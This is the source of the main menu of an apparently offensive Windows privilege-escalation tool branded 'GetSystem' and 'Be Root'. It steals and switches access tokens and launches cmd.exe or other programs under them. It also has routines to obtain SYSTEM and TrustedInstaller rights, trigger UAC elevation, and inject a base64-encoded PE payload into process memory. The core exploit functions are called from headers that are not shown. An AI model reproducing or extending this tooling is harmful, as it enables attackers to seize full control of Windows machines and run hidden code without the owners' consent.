// getsystem.cpp : Defines the entry point for the console application.
//

/***
*     __         __
*     )_)  _     )_) _   _  _)_
*    /__) )_)   / \ (_) (_) (_
*        (_
*      ___        ___          _
*     | _ ) ___  | _ \___  ___| |_
*     | _ \/ -_) |   / _ \/ _ \  _|
*     |___/\___| |_|_\___/\___/\__|
*/

#include "stdafx.h"

// https://sourceforge.net/p/predef/wiki/Architectures/
#if MSVC
#ifdef _M_X86
#define ARCH_X86
#else
#define ARCH_X64
#endif
#endif

#if __GNUC__
#ifdef __i386__
#define ARCH_X86
#else
#define ARCH_X64
#endif
#endif

#if __MINGW32__ // this is also defined by MinGW64
#ifdef _X86_
#define ARCH_X86
#else
#define ARCH_X64
#endif
#endif

#include "utils.h"
#include "testFunctions.h"
#include "tokenmgt.h"
#include "namedpipe.h"
#include "launchprocess.h"
#include "service.h"
#include "payloads.h"
#include "base64.h"
#include "elevate.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define MAX_PROGNAME_LENGTH 256

typedef struct GlobalConfiguration GlobalConfiguration;
struct GlobalConfiguration
{
	TokenCollection * tokens;	// tokens
	wchar_t * argv0;
	//wchar_t * garbagePath;		// path for temporary files
	//wchar_t * persistencePath;	// path for persistent files
};

//DWORD WINAPI mainThreadProc(TokenCollection * tokens);
DWORD WINAPI mainThreadProc(GlobalConfiguration * globalConf);

int main(int argc, char ** argv)
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	/*
	wprintf(L"");
	wprintf(L"     __         __\n");
	wprintf(L"     )_)  _     )_) _   _  _)_\n");
	wprintf(L"    /__) )_)   / \\ (_) (_) (_\n");
	wprintf(L"        (_\n");
	wprintf(L"\n");
	*/
	/*
	wprintf(L"");
	wprintf(L"     ___        ___          _\n");
	wprintf(L"    | _ ) ___  | _ \\___  ___| |_\n");
	wprintf(L"    | _ \\/ -_) |   / _ \\/ _ \\  _|\n");
	wprintf(L"    |___/\\___| |_|_\\___/\\___/\\__|\n");
	wprintf(L"\n");
	*/
	wprintf(L"");
	wprintf(L"      _____    __  ____         __\n");
	wprintf(L"     / ___/__ / /_/ __/_ _____ / /____ __ _\n");
	wprintf(L"    / (_ / -_) __/\\ \\/ // (_-</ __/ -_)  ' \\\n");
	wprintf(L"    \\___/\\__/\\__/___/\\_, /___/\\__/\\__/_/_/_/\n");
	wprintf(L"                    /___/\n");
	wprintf(L"\n");

	TokenCollection tokenCollection = { 0 };
	GlobalConfiguration globalConf = { 0 };
	HANDLE hMainThread = NULL;

	// Conversion of argv[0] to wchar_t. Should be obsolete on next version (need Win-based console application with WinMain as entrypoint)
	size_t origSize = strlen(argv[0]) + 1;
	size_t convertedChars = 0;

	initConsole();

	DWORD dwProcesses[1024] = { 0 };

	globalConf.argv0 = malloc(sizeof(wchar_t) * origSize);

	mbstowcs_s(&convertedChars, globalConf.argv0, origSize, argv[0], _TRUNCATE);

	globalConf.tokens = &tokenCollection;
	//globalConf.argv0 = pCmdLine;

	// get legit primary token from initial process
	//if (initTokenCollection(&tokenCollection))
	if (initTokenCollection(globalConf.tokens))
		WPRINTD_SUCCESS(L"main()::initTokenCollection - token retrieved and added to collection - SUCCESS\n");
	else
		WPRINTD_ERROR(L"main()::initTokenCollection - the token could not be retrieved - FAIL\n", GetLastError());

	hMainThread = CreateThread
	(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)mainThreadProc,
		&globalConf,//&tokenCollection,
		0,
		NULL
	);

	WaitForSingleObject(hMainThread, INFINITE);

	free(globalConf.argv0);
	freeTokenCollection(&tokenCollection); // Free memory of all tokens and the collection itself
	cleanupConsole();
	CloseHandle(hMainThread);

	return 0;
}

//DWORD WINAPI mainThreadProc(TokenCollection * tokens)
DWORD WINAPI mainThreadProc(GlobalConfiguration * globalConf)
{
	BOOL done = FALSE;
	BOOL showMenu = TRUE;
	int choice = -1;
	unsigned int i = 0;

	unsigned char * decodedPayload = NULL;
	size_t decodedPayloadLen = 0;
	FILE* file = NULL;

	TokenCollection * tokens = globalConf->tokens;

	wchar_t inputBuffer[MAX_PROGNAME_LENGTH] = { 0 };

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	HANDLE elevThread = NULL;

	setDefaultStartupInfo(&si);

	while (!done)
	{
		choice = -1;
		if (showMenu)
		{
			wprintf(L"\n");
			wprintf(L"[0] Exit\n\n"); // Free all memory, close handles then exit program

			wprintf(L"[1] Start a cmd with current token\n");
			wprintf(L"[2] Start a process with current token\n");	// Create process with current token
			wprintf(L"[3] Restart current process as current token (opens a new console, other tokens are lost)\n\n");

			wprintf(L"[4] Print informations about current token\n"); // printTokenInformations(token);
			wprintf(L"[5] Show available tokens\n\n");

			wprintf(L"[6] Change current token\n\n"); // Change current token

			wprintf(L"[7] Get system tokens\n\n"); // namedpipe + service

			wprintf(L"[8] Try to trigger UAC: run process in high integrity context\n\n"); // triggerUAC();
			wprintf(L"[9] Show this menu\n\n"); // set showMenu to TRUE

			wprintf(L"[10] [EXPERIMENTAL] Get TrustedInstaller\n\n");
			wprintf(L"[11] [EXPERIMENTAL] Unmap view of section code injection\n");
			wprintf(L"[12] [EXPERIMENTAL] Write process memory WITH TOKEN, no unmap (TODO: try to overlap process mem by writing too big buffer)\n\n");

			wprintf(L"[13] Start a process the easy way, without specifying token (using process owner default token)\n\n");

			wprintf(L"Token currently in use: %ls\\%ls\n\n", getCurrentToken(tokens)->domainName, getCurrentToken(tokens)->username);

			showMenu = FALSE;
		}
		wprintf(L"> ");

		while (choice < 0 || choice > 13) choice = (int)scanLong();

		switch (choice)
		{
		case 1:
		{
			// Start a cmd with current token
			if (!CreateProcessWithTokenW(getCurrentToken(tokens)->hPrimaryToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe",
				NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
				WPRINTD_ERROR(L"CreateProcessWithTokenW - cmd.exe - FAIL\n", GetLastError());
			else
				WPRINTD_SUCCESS(L"CreateProcessWithTokenW - cmd.exe - SUCCESS\n");
			break;
		}
		case 2:
		{
			// Start a program (inputBuffer << stdin) with current token
			WPRINTD_INFO(L"Enter a program to launch with current token\n");
			wprintf(L"> ");
			wScanStr(inputBuffer, MAX_PROGNAME_LENGTH);

			if (!CreateProcessWithTokenW(getCurrentToken(tokens)->hPrimaryToken, LOGON_WITH_PROFILE, (LPCWSTR)inputBuffer,
				NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
				WPRINTD_ERROR(L"CreateProcessWithTokenW - FAIL\n", GetLastError());
			else
				WPRINTD_SUCCESS(L"CreateProcessWithTokenW - SUCCESS\n");
			break;
		}
		case 3:
		{
			// Start argv[0] with current token and kill this process

			if (!CreateProcessWithTokenW(getCurrentToken(tokens)->hPrimaryToken, LOGON_WITH_PROFILE, globalConf->argv0,
				NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
				WPRINTD_ERROR(L"CreateProcessWithTokenW - argv[0] - FAIL\n", GetLastError());
			else
				WPRINTD_SUCCESS(L"CreateProcessWithTokenW - argv[0] - SUCCESS\n");

			done = TRUE;
			break;
		}
		case 4:
		{
			// Print current token informations
			printTokenInformations(getCurrentToken(tokens));
			break;
		}
		case 5:
		{
			// Show available tokens
			DWORD i = 0;
			for (i = 0; i < tokens->dwNbTokens; i++)
				wprintf(L"%d\t%ls\\%ls\n", tokens->tokens[i].uniqueID, tokens->tokens[i].domainName, tokens->tokens[i].username);

			break;
		}
		case 6:
		{
			DWORD i = 0;
			DWORD tokenChoice = 0;
			BOOL tokenFound = FALSE;
			for (i = 0; i < tokens->dwNbTokens; i++)
				wprintf(L"%d\t%ls\\%ls\n", tokens->tokens[i].uniqueID, tokens->tokens[i].domainName, tokens->tokens[i].username);

			wprintf(L"Which token to use?\n\n> ");
			(DWORD)tokenChoice = scanLong();
			for (i = 0; i < tokens->dwNbTokens; i++) {
				if (tokens->tokens[i].uniqueID == tokenChoice) {
					tokens->dwCurrToken = tokenChoice;
					tokenFound = TRUE;
				}
			}
			if (!tokenFound)
				WPRINTD_ERROR(L"Wrong token ID - FAIL\n", GetLastError());
			else
				WPRINTD_SUCCESS(L"Current token changed\n");

			break;
		}
		case 7:
		{
			// Get system
			if (!getsystem(tokens))
				WPRINTD_ERROR(L"[beroot.c] mainThreadProc. getsystem - FAIL\n", GetLastError());
			else
				WPRINTD_SUCCESS(L"getsystem - SUCCESS\n");
			break;
		}
		case 8:
		{
			triggerUAC();
			break;
		}
		case 9:
		{
			// Show menu at next loop
			showMenu = TRUE;
			break;
		}
		case 10:
		{
			// Get TrustedInstaller

			if (!getTrustedInstaller(tokens))
				WPRINTD_ERROR(L"[beroot.c] mainThreadProc. getTrustedInstaller - FAIL\n", GetLastError());
			else
				WPRINTD_SUCCESS(L"getTrustedInstaller - SUCCESS\n");

			//PrintProcesses(); // This one works but relies on TlHelp32
			/*
			if (!CreateProcessAsUserW(getCurrentToken(tokens)->hPrimaryToken, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
			WPRINTD_ERROR(L"[beroot.c] mainThreadProc. CreateProcessAsUserW - FAIL\n", GetLastError());
			else
			WPRINTD_SUCCESS(L"CreateProcessAsUserW - SUCCESS\n");
			*/
			break;
		}
		case 11:
		{
			size_t outLen = 0;
			size_t inLen = strlen(dummyProc);
			unsigned char * blob = NULL;

			base64_decode(dummyProc, inLen, &outLen);

			if (outLen > 0)
				blob = malloc(outLen);

			blob = base64_decode(dummyProc, inLen, &outLen);
			if (blob == NULL) {
				WPRINTD_ERROR(L"[beroot.c] mainThreadProc. base64_decode - FAIL\n", GetLastError());
				break;
			}
			mapProcessMem(blob);

			WPRINTD_ERROR(L"Last error check\n", GetLastError());

			if (blob != NULL)
				free(blob);
			break;
		}
		case 12:
		{
			size_t outLen = 0;
			size_t inLen = strlen(dummyProc);
			unsigned char * blob = NULL;

			base64_decode(dummyProc, inLen, &outLen);

			if (outLen > 0)
				blob = malloc(outLen);

			blob = base64_decode(dummyProc, inLen, &outLen);
			if (blob == NULL) {
				WPRINTD_ERROR(L"[beroot.c] mainThreadProc. base64_decode - FAIL\n", GetLastError());
				break;
			}
			else
				WPRINTD_SUCCESS(L"[beroot.c] mainThreadProc. base64_decode - SUCCESS\n");

			if (mapPeWithTokenW(getCurrentToken(tokens), blob))
				WPRINTD_SUCCESS(L"[beroot.c] mainThreadProc. mapPeWithTokenW - SUCCESS\n");
			else
				WPRINTD_ERROR(L"[beroot.c] mainThreadProc. mapPeWithTokenW - FAIL\n", GetLastError());

			//WPRINTD_ERROR(L"Last error check", GetLastError());

			if (blob != NULL)
				free(blob);
			break;
		}
		case 13:
			startTaskmgr();
			wprintf(L"Last error: %d\n", GetLastError());
			break;
		case 0:
		{
			done = TRUE;
			break;
		}
		default:
			break;
		}
		printf("\n");
	}

	return ERROR_SUCCESS;
}
